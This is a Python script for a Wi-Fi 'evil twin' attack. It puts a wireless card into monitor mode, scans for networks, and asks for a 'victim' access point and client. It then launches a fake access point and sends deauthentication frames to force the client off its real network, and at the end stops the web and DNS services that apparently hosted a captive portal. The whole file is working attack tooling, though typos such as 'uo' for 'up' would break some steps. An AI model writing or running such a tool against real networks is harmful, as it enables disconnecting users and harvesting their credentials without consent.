#!/use/bin/env python3
from subprocess import call, Popen
from colorama import init, Fore
from time import sleep
from deauth import deauth

init()


RED = Fore.RED
GREEN = Fore.GREEN
CYAN = Fore.CYAN
BLUE = Fore.BLUE
RESET = Fore.RESET


print(call(["sudo", "iwconfig"]))

print(f"\n\n[>]{GREEN} Choose Monitor Interface:{RESET} ", end='')
iface = input()

print(f'[+] {BLUE}Setting {iface} to monitor...{RESET}', end='')
call(["sudo", "ifconfig", iface, "down"])
call(["sudo", "iwconfig", iface, "mode", "monitor"])
call(["sudo", "ifconfig", iface, "uo"])
print(f'{RED}Done!{RESET}')

try:
    call(["sudo", "airodump-ng", iface])
except KeyboardInterrupt:
    pass

print(f"[>]{BLUE} Enter Victim AP BSSID : {RESET}", end="")
bssid = input()
print(f"[>]{BLUE} Enter Victim AP Channel : {RESET}", end="")
channel = input()

print(f"[+] {RED}Starting Client Scan in new Window{RESET}")
p1 = Popen(["xterm", "-hold", "-e", "python3", "client_scan.py", bssid, channel, iface, "&"])
sleep(5)

print(f"[+] {RED}Starting AP...{RESET}  ", end="")
p2 = Popen(["xterm", "-hold", "-e", "python3", "fake_ap.py", "&"])
sleep(3)
print(f"{GREEN}Done!{RESET}")

print(f"[>]{BLUE} Enter Victim Client BSSID : {RESET}", end="")
client = input()
print(f"[+] {RED}Disconnecting Client {client}{RESET}")

deauth(20, iface, client, bssid)
print(f"[>]{GREEN} Press Enter To Finish Attack Program : {RESET}")
client = input()

print(f'[+] {BLUE}Closing Terinals...{RESET}', end="")
p1.kill()
p2.kill()
print(f'{RED}Done!{RESET}')

print(f'[+] {BLUE}Reverting {iface} to managed...{RESET}', end='')
call(["sudo", "ifconfig", iface, "down"])
call(["sudo", "iwconfig", iface, "mode", "managed"])
call(["sudo", "ifconfig", iface, "uo"])
print(f'{RED}Done!{RESET}')

call(["sudo", "service", "apache2", "stop"])
call(["sudo", "service", "dnsmasq", "stop"])
sleep(1)
print(f"[+] {GREEN} ALL DONE... {RESET}")
print(f"[+] {GREEN} GOODBYE! :) {RESET}")
